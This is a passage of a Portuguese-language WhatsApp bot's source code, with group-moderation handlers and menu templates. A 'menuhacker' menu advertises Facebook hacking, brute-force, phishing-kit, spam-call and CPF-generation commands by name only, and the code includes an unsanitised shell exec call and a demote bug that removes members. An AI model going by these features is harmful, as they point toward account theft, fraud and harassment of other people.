						mentions(`Ok, chefe. esse cara aqui: @${mentioned[0].split('@')[0]} agora é admin do grupo!`, mentioned, true)
						client.groupMakeAdmin(from, mentioned)
					}
					break
				case 'rebaixar':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Berhasil Demote\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
						mentions(`Ok, chefe. esse cara aqui: @${mentioned[0].split('@')[0]} perdeu o adm com sucesso!`, mentioned, true)
						client.groupDemoteAdmin(from, mentioned)
					}
					break
				case 'add':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (args.length < 1) return reply('Você quer adicionar um gênio?')
					if (args[0].startsWith('08')) return reply('Use o código do país, man')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						client.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Falha ao adicionar destino, talvez porque é privado')
					}
					break
				case 'banir':
				 	if (!isOwner) return reply(mess.only.ownerB)
					if (!isGroup) return reply(mess.only.group)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('A marca-alvo que você quer chutar!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Alvo removido com sucesso :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						client.groupRemove(from, mentioned)
					} else {
						mentions(`Alvo removido com sucesso  : @${mentioned[0].split('@')[0]}`, mentioned, true)
						client.groupRemove(from, mentioned)
					}
					break
				case 'admins':
					if (!isGroup) return reply(mess.only.group)
					teks = `Lista de admins do grupo *${groupMetadata.subject}*\nTotal : ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
                                case 'linkgp':
                                        if (!isGroup) return reply(mess.only.group)
                                        if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                                        linkgc = await client.groupInviteCode(from)
                                        reply('https://chat.whatsapp.com/'+linkgc)
                                        break
                                case 'leave':
                                        if (!isGroup) return reply(mess.only.group)
                                        if (isGroupAdmins || isOwner) {
                                            client.groupLeave(from)
                                        } else {
                                            reply(mess.only.admin)
                                        }
                                        break
				case 'toimg':
					if (!isQuotedSticker) return reply('{ ❗ } *Marque a figurinha*')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ Falha ao converter adesivos em imagens ❌')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: '>//<'})
						fs.unlinkSync(ran)
					})
					break
				case 'simi':
					if (args.length < 1) return reply('Onde está o texto, hum?')
					teks = body.slice(5)
					anu = await simih(teks) //fetchJson(`https://mhankbarbars.herokuapp.com/api/samisami?text=${teks}`, {method: 'get'})
					//if (anu.error) return reply('Simi ga tau kak')
					reply(anu)
					break
				case 'simih':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isSimi) return reply('O modo Simi está ativo')
						samih.push(from)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Ativado com sucesso o modo simi neste grupo 😗️')
					} else if (Number(args[0]) === 0) {
						samih.splice(from, 1)
						fs.writeFileSync('./src/simi.json', JSON.stringify(samih))
						reply('Desativado modo simi com sucesso neste grupo 😡️')
					} else {
						reply('1 para ativar, 0 para desativar, lerdao vc em KKKKK')
					}
					break
				case 'bemvindo':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Já esta ativo.')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Ativou com sucesso o recurso de boas-vindas neste grupo 😉️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Desativou com sucesso o recurso de boas-vindas neste grupo 😡️')
					} else {
						reply('1 para ativar, 0 para desativar, lerdão vc em KAKKKK')
					}
                                      break
				case 'clonar':
					if (!isGroup) return reply(mess.only.group)
	            	if (!isPremium) return reply('Ola, esse comando e apenas para vips, para ver como se tornar vip, digite .daftarvip, olaf agradece ❤️!' ,text, { quoted: mek })
					if (args.length < 1) return reply('Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
					try {
						pp = await client.getProfilePicture(id)
						buffer = await getBuffer(pp)
						client.updateProfilePicture(botNumber, buffer)
						mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [jid], true)
					} catch (e) {
						reply('Putz, deu erro, a pessoa deve estar sem foto 😔')
					}
					break
		        case 'setfoto2':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isadminbot) return reply('Quem é Você?')
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                    media = await client.downloadAndSaveMediaMessage(mek)
                    await client.updateProfilePicture (from, media)
                    reply('Alterado com sucesso o ícone do Grupo')
                    break
                case 'bc2':
					if (!isadminbot) return reply('Quem é Você?')
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `[ admin bot Broadcast ]\n\n${body.slice(4)}`})
						}
						reply('Transmissao enviada')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `[ *admin bot Broadcast* ]\n\n${body.slice(4)}`)
						}
						reply('Transmissão enviada')
					}
					break
case 'help':
case 'menu':
uptime = process.uptime()
const sy =['Não viva somente do que faz sentido','Livre-se dos bajuladores','Não julgue sem conhecer','Não grite alto por sua felicidade','Não se leve o pensamento dos outros','As vzs vale a pena ser frio(a)','Bobeira é não viver a realidade','Sem conselhos, dsclp','A verdade alivia mais do que machuca','Cuidado com oq fala','Se não puder se destacar pelo talento, vença pelo esforço']
const dreps = sy[Math.floor(Math.random() * sy.length)]
const dups =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const skr = dups[Math.floor(Math.random() * dups.length)]

			        menu = `${line17}
			        
${line15}𝕺𝖑𝖆𝖋 𝕭𝖔𝖙 ${line4}
${line}
${line} *Ola ${pushname}️🔥*
${line}
${line} *Bem vindo ao ${line18}*
${line}
${line} *Meu tempo ativo é:*
${line}
${line} *${kyun(uptime)}*
${line}
${line} *Conselho aleatório:* 
${line}	
${line}	*${dreps}*	
${line}		        			        
${line3} MENU ${line4}
${line}
${line2} ${line5}
${line2} ${line14}
${line2} ${line11} ${nomd}
${line2} ${line12}
${line2} ${line13}
${line}
${line3} REGRAS ${line4}
${line}
${line} *REGRAS PRA ADMS DE GP*
${line}
${line} *.regras »*
${line} 
${line} *COMANDOS⤵️*
${line} 
${line} *.help1 »*
${line} 
╚═〘 𝕺𝖑𝖆𝖋 𝕭𝖔𝖙 ❤️ 〙`
			        reply(menu)
			        break
case 'figmenu':
case 'figmenu':
uptime = process.uptime()
const xx =['Não deixe dominar se pelo passado você vive no presente caminhando para o futuro','Por vezes sentimos que aquilo que fazemos não é senão uma gota de água no mar Mas o mar seria menor se lhe faltasse uma gota','Não deixe que as pessoas te façam desistir daquilo que você mais quer na vida Acredite Lute Conquiste E acima de tudo seja feliz','Alague seu coração de esperanças mas não deixe que ele se afogue nelas']
const dre = xx[Math.floor(Math.random() * xx.length)]
const du =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const sr = du[Math.floor(Math.random() * du.length)]

			        figmenu = `
${line23}FIGMENU${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line20}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${dre}*	
${line21}${line26}		        			        
${line21} 
${line22} *${prefix}figu*
${line22} *${prefix}toimg*
${line22} *${prefix}gif*
${line22} *${prefix}addsticker*
${line22} *${prefix}liststicker*
${line22} *${prefix}getsticker (nome)*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(figmenu)
			        break
case 'menugp':
case 'menugp':
uptime = process.uptime()
const cc =['Não deixe de fazer algo que gosta devido à falta de tempo; a única falta que terá, será desse tempo que infelizmente não voltará jamais.','Se você pode dizer e alguém pode ouvir, não deixe de falar. Amanhã pode ser tarde demais.','Aquilo que se faz por amor está sempre além do bem e do mal.','A vida é maravilhosa se não se tem medo dela.']
const fr = cc[Math.floor(Math.random() * cc.length)]
const cu =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const rr = cu[Math.floor(Math.random() * cu.length)]

			        menugp = `
${line23}MENUGP${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line29}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${fr}*	
${line21}${line26}
${line21}		        			        
${line22} *${prefix}linkgp*
${line22} *${prefix}grupoinfo*
${line22} *${prefix}marcar*
${line22} *${prefix}add [@]*
${line22} *${prefix}banir [@]*
${line22} *${prefix}promover [@]*
${line22} *${prefix}rebaixar [@]*
${line22} *${prefix}admins*
${line22} *${prefix}marca2*
${line22} *${prefix}marca3*
${line22} *${prefix}bomdia*
${line22} *${prefix}boatarde*
${line22} *${prefix}boanoite*
${line22} *${prefix}clonar [@]*
${line22} *${prefix}brainly [pergunta]*
${line22} *${prefix}setname*
${line22} *${prefix}setfoto*
${line22} *${prefix}setdesc*
${line22} *${prefix}setnome*
${line22} *${prefix}online*
${line22} *${prefix}divu (divulgação)*
${line22} *${prefix}perfil* 
${line22} *${prefix}ping [ver velocidade do bot]*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menugp)
			        break
case 'diversãomenu':
case 'diversãomenu':
uptime = process.uptime()
const ww =['A amizade desenvolve a felicidade e reduz o sofrimento, duplicando a nossa alegria e dividindo a nossa dor.','Há sempre alguma loucura no amor. Mas há sempre um pouco de razão na loucura.','Deve-se temer mais o amor de uma mulher do que o ódio de um homem.','O importante não é vencer todos os dias, mas lutar sempre.','O passado não reconhece o seu lugar: está sempre presente...','Quem comete uma injustiça é sempre mais infeliz que o injustiçado.']
const cr = ww[Math.floor(Math.random() * ww.length)]
const hu =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const ll = hu[Math.floor(Math.random() * hu.length)]

			        diversãomenu = `
${line23}DIVERSÃOMENU${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line30}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${cr}*	
${line21}${line26}
${line21}		        			        
${line22} *${prefix}gado*
${line22} *${prefix}lgbt*
${line22} *${prefix}gay1*
${line22} *${prefix}gay [@]*
${line22} *${prefix}iludido*
${line22} *${prefix}corno [@]*
${line22} *${prefix}golpe*
${line22} *${prefix}dado
${line22} *${prefix}amor [@]*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(diversãomenu)
			        break
case 'menuativar':
case 'menuativar':
uptime = process.uptime()
const jo =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const je = jo[Math.floor(Math.random() * jo.length)]
const ji =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const aw = ji[Math.floor(Math.random() * ji.length)]

			        menuativar = `
${line23}MENUATIVAR${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line31}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${je}*	
${line21}${line26}
${line21}		        		        
${line22} *${prefix}bemvindo [1/0]*
${line22} *${prefix}simih [1/0]*
${line22} *${prefix}leveling [1/0]*
${line22} *${prefix}modonsfw [1/0]*
${line22} *${prefix}antiracismo [1/0]*
${line22} *${prefix}antihomofobia [on/off]*
${line22} *${prefix}antitrava [on/off*
${line22} *${prefix}antifake [on/off]*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menuativar)
			        break
case 'menupremium':
case 'menupremium':
uptime = process.uptime()
const jp =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const jq = jp[Math.floor(Math.random() * jp.length)]
const jc =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const qw = jc[Math.floor(Math.random() * jc.length)]

			        menupremium = `
${line23}MENUPREMIUM${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line32}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${jq}*	
${line21}${line26}
${line21}		         
${line22} *${prefix}cekvip*
${line22} *${prefix}premiumlist*
${line22} *${prefix}delete*
${line22} *${prefix}modapk*
${line22} *${prefix}indo10*
${line22} *${prefix}daftarvip [para virar premium]*
${line22} *${prefix}qrcode*
${line22} *${prefix}chentai*
${line22} *${prefix}gcpf*
${line22} *${prefix}gbin*
${line22} *${prefix}pack*
${line22} *${prefix}destrava*
${line22} *${prefix}gpessoa* 
${line22} *${prefix}addaud*
${line22} *${prefix}getaud (nome)*
${line22} *${prefix}listaud*
${line22} *${prefix}addimagem*
${line22} *${prefix}getimagem (nome)*
${line22} *${prefix}listimagem*
${line22} *${prefix}addvideo*
${line22} *${prefix}getvideo (nome)*
${line22} *${prefix}listvideo*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menupremium)
			        break
               case 'menuanimes':
uptime = process.uptime()
const sa =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const sm = sa[Math.floor(Math.random() * sa.length)]
const xb =['4','9','8','7','2','5','1','0 que azar','3','6','10']
wew = fs.readFileSync(`./outros/logo.jpg`)
const mw = xb[Math.floor(Math.random() * xb.length)]
                    wew = fs.readFileSync(`./olaf/animes.jpg`)
                    menuanimes = `			
━━━━━━━━━❮MENUANIMES❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *Oir ${pushname}️🍀*
┃
┃ *Bem vindo ao ${line33}*
┃
┃ *Conselho aleatório:*
┃ 
┃ *${sm}*
┃▬▬▬▬▬▬▬【☪】▬▬▬▬▬▬▬
┃
┃➥ *${prefix}minato [aleatório]*
┃➥ *${prefix}boruto [aleatório]*
┃➥ *${prefix}hinata [aleatório]*
┃➥ *${prefix}sasuke [aleatório]*
┃➥ *${prefix}sakura [aleatório]*
┃➥ *${prefix}naruto [aleatório]*
┃➥ *${prefix}rize [aleatório]*
┃➥ *${prefix}miku [aleatório]*
┃➥ *${prefix}miku2 [aleatório]*
┃➥ *${prefix}kurumi [aleatório]*
┃➥ *${prefix}chika [aleatório]*
┃➥ *${prefix}husbu [aleatório]*
┃➥ *${prefix}rem [aleatório]*
┃➥ *${prefix}touka [aleatório]*
┃➥ *${prefix}rize2 [aleatório]*
┃➥ *${prefix}akira [aleatório]*
┃➥ *${prefix}akira2 [aleatório]*
┃➥ *${prefix}itori [aleatório]*
┃➥ *${prefix}itori2 [aleatório]*
┃➥ *${prefix}lofi*
┃
┃ *TERMINAMOS POR AQUI ${pushname}️👋🏼*
┗━───────────────────────────╯
` 
                    client.sendMessage(from, wew, image, { quoted: mek, caption: menuanimes })
					break
case 'menuvoicemod':
case 'menuvoicemod':
uptime = process.uptime()
const hj =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const po = hj[Math.floor(Math.random() * hj.length)]
const jt =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const pz = jt[Math.floor(Math.random() * jt.length)]

			        menuvoicemod = `
${line23}MENUVOICEMOD${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line34}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${po}*	
${line21}${line26}
${line21}	
${line22} *${prefix}normal (marque o audio)*
${line22} *${prefix}esquilo (marque o audio)*
${line22} *${prefix}estourar (marque o audio)*
${line22} *${prefix}diabolico (marque o audio)*
${line22} *${prefix}bass (marque o audio)*
${line22} *${prefix}gemok (marque o audio)*
${line22} *${prefix}slow (marque o audio)*
${line22} *${prefix}tupai (marque o audio)*	        		        
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menuvoicemod)
			        break
case 'menulogos':
case 'menulogos':
uptime = process.uptime()
const bv =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const ak = bv[Math.floor(Math.random() * bv.length)]
const iu =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const xo = iu[Math.floor(Math.random() * iu.length)]

			        menulogos = `
${line23}MENULOGOS${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line35}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${ak}*	
${line21}${line26}
${line21}	
${line22} *${prefix}pslogo (seu texto)*
${line22} *${prefix}milogo (seu texto)*
${line22} *${prefix}aguia (seu texto)*
${line22} *${prefix}monkey (seu texto)*
${line22} *${prefix}dnulis (seu texto)*
${line22} *${prefix}dmeme (seu texto)*
${line22} *${prefix}dnobg (seu texto)*
${line22} *${prefix}dnobg2 (seu texto/seu texto)*
${line22} *${prefix}tlogo (seu texto)*
${line22} *${prefix}nlogo (seu texto)*
${line22} *${prefix}black (seu texto)*
${line22} *${prefix}clogo (seu texto)*
${line22} *${prefix}glogo (seu texto/seu texto)*
${line22} *${prefix}aguia2 (seu texto/seu texto)*
${line22} *${prefix}wlogo (seu texto)*
${line22} *${prefix}letxt (seu texto)*
${line22} *${prefix}text3d (seu texto)*
${line22} *${prefix}amor (tamanho/blush)* [numeros]
${line22} *${prefix}frase (seu texto/seu texto)*
${line22} *${prefix}canal (seu texto)*
${line22} *${prefix}plogo (seu texto)* [plaquinha]
${line22} *${prefix}bitext (seu texto)*
${line22} *${prefix}chlogo (número)*
${line22} *${prefix}plogo2 (seu texto/tamanho)*
${line22} *${prefix}placa* (nome)
${line22} *${prefix}mtext* (limite,50/dia)
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menulogos)
			        break
case 'menudownloads':
case 'menudownloads':
uptime = process.uptime()
const vz =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const vb = vz[Math.floor(Math.random() * vz.length)]
const vv =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const vp = vv[Math.floor(Math.random() * vv.length)]

			        menudownloads = `
${line23}MENUDOWNLOADS${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line36}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${vb}*	
${line21}${line26}
${line21}		      
${line22} *${prefix}play (nome)*
${line22} *${prefix}ytsearch*
${line22} *${prefix}pinterest (nome)*
${line22} *${prefix}ytmp4 (link)
${line22} *${prefix}letrasmsc* 		  
${line22} *${prefix}happymod [jogo/app]*
${line22} *${prefix}moddroid [jogo/app]*
${line22} *${prefix}ttp [linguagem]*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menudownloads)
			        break
case 'menuhacker':
case 'menuhacker':
uptime = process.uptime()
const ax =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const al = ax[Math.floor(Math.random() * ax.length)]
const as =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const ao = as[Math.floor(Math.random() * as.length)]

			        menuhacker = `
${line23}MENUHACKER${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line37}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${al}*	
${line21}${line26}
${line21}	
${line22} *${prefix}fbcheker*
${line22} *${prefix}hackfb*
${line22} *${prefix}bruteforcefb*
${line22} *${prefix}toolsphishing*
${line22} *${prefix}terkeytermux*
${line22} *${prefix}socialfishv2*
${line22} *${prefix}tool*
${line22} *${prefix}iplog (ip)* [consulta ip]
${line22} *${prefix}cpfg* [bot gera cpf]
${line22} *${prefix}bcep (cep)* [consulta cep]
${line22} *${prefix}consultas*	    
${line22} *${prefix}spamcall*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menuhacker)
			        break
case 'menudono':
case 'menudono':
uptime = process.uptime()
const sx =['Foge por um instante do homem irado, mas foge sempre do hipócrita.','Deve-se aprender sempre, até mesmo com um inimigo.','Ninguém ignora tudo. Ninguém sabe tudo. Todos nós sabemos alguma coisa. Todos nós ignoramos alguma coisa. Por isso aprendemos sempre.','A gente só morre uma vez. Mas é para sempre.','Assuma o comando da sua atitude. Não deixe que outra pessoa a escolha por você.','Cada segundo é tempo para mudar tudo para sempre.']
const sh = sx[Math.floor(Math.random() * sx.length)]
const sf =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const sj = sf[Math.floor(Math.random() * sf.length)]

			        menudono = `
${line23}MENUDONO${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line38}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${sh}*	
${line21}${line26}
${line21}	
${line22} *${prefix}bloqueados*
${line22} *${prefix}desbloquear*
${line22} *${prefix}dono*
${line22} *${prefix}bloquear*
${line22} *${prefix}bc [texto]* (ele faz uma ™)
${line22} *${prefix}setprefix*
${line22} *${prefix}setnomebot*
${line22} *${prefix}bug*
${line22} *${prefix}owner*
${line22} *${prefix}limpar*
${line22} *${prefix}setppbot (marque uma img)*
${line22} *${prefix}desligar (so para o dono)*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menudono)
			        break
case 'menu18':
case 'menu18':
uptime = process.uptime()
const ousa =['safado quer conselhos pra punheta agr é?']
const ouso = ousa[Math.floor(Math.random() * ousa.length)]
const ousi =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const ouvi = ousi[Math.floor(Math.random() * ousi.length)]

			        menu18 = `
${line23}MENU+18${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line39}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${ouso}*	
${line21}${line26}
${line21}
${line22} *${prefix}porno*
${line22} *${prefix}mia*
${line22} *${prefix}atris*
${line22} *${prefix}belle [img aleatórias]*
${line22} *${prefix}reislin*
${line22} *${prefix}malkova*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menu18)
			        break
case 'menuvoz':
case 'menuvoz':
uptime = process.uptime()
const wey =['cansei de dá conselhos amigo']
const wqo = wey[Math.floor(Math.random() * wey.length)]
const wty =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const wyi = wty[Math.floor(Math.random() * wty.length)]

			        menuvoz = `
${line23}MENUVOZ${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line40}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${wqo}*	
${line21}${line26}
${line21}
${line22} *${prefix}ola*
${line22} *${prefix}bv*
${line22} *${prefix}tchau*
${line22} *${prefix}bem*
${line22} *${prefix}a*
${line22} *${prefix}fdp*
${line22} *${prefix}onich*
${line22} *${prefix}beat1*
${line22} *${prefix}glub*
${line22} *${prefix}olaf*
${line22} *${prefix}bate*
${line22} *${prefix}aham*
${line22} *${prefix}susto*
${line22} *${prefix}clbc*
${line22} *${prefix}pretende?*
${line22} *${prefix}puta*
${line22} *${prefix}delicia*
${line22} *${prefix}boatarde*
${line22} *${prefix}bomdia*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menuvoz)
			        break
case 'menuprefix':
case 'menuprefix':
uptime = process.uptime()
const oudy =['cansei de dá conselhos amigo']
const ousb = oudy[Math.floor(Math.random() * oudy.length)]
const ousq =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const ousx = ousq[Math.floor(Math.random() * ousq.length)]

			        menuprefix = `
${line23}MENUSEMPREFIX${line24}
${line25}
${line21}
${line21} *Oir ${pushname}️🍀*
${line21}
${line21} *Bem vindo ao ${line41}*
${line21}
${line21} *Conselho aleatório:*
${line21}	
${line21}	*${ousb}*	
${line21}${line26}
${line21}
${line22} *bah*
${line22} *oii*
${line22} *bv*
${line22} *canta ai bot*
${line22} *grita*
${line22} *digita*
${line22} *machista*
${line22} *olaf?*
${line22} *olaf*
${line22} *susto*
${line22} *bate*
${line22} *aham pq?*
${line22} *clbc*
${line22} *pretende?*
${line22} *puta*
${line22} *delicia*
${line22} *boatarde*
${line22} *bomdia*
${line21}
${line21} *TERMINAMOS POR AQUI ${pushname}️👋🏼*
${line27}`
			        reply(menuprefix)
			        break
               case 'menuedits':
uptime = process.uptime()
const kila =['A esperança é um alimento da nossa alma, ao qual se mistura sempre o veneno do medo.','Algumas pessoas nunca cometem os mesmos erros duas vezes. Descobrem sempre novos erros para cometer.','O passado e o futuro parecem-nos sempre melhores; o presente, sempre pior.','Foi um grande conselho o que ouvi certa vez, dado a um jovem: "Faça sempre o que tiver medo de fazer".','Se você agir sempre com dignidade, talvez não consiga mudar o mundo, mas será um canalha a menos.','Trabalha como se vivesses para sempre. Ama como se fosses morrer hoje.']
const koro = kila[Math.floor(Math.random() * kila.length)]
const kuru =['4','9','8','7','2','5','1','0 que azar','3','6','10']
const kert = kuru[Math.floor(Math.random() * kuru.length)]
                    wew = fs.readFileSync(`./olaf/edits.jpg`)
                    menuedits = `			
━━━━━━━━━❮MENUEDITS❯━━━━━━━━━
┏━───────────────────────────╮
┃
┃ *Oir ${pushname}️🍀*
┃
┃ *Bem vindo ao ${line42}*
┃
┃ *Conselho aleatório:*
┃ 
┃ *${koro}*
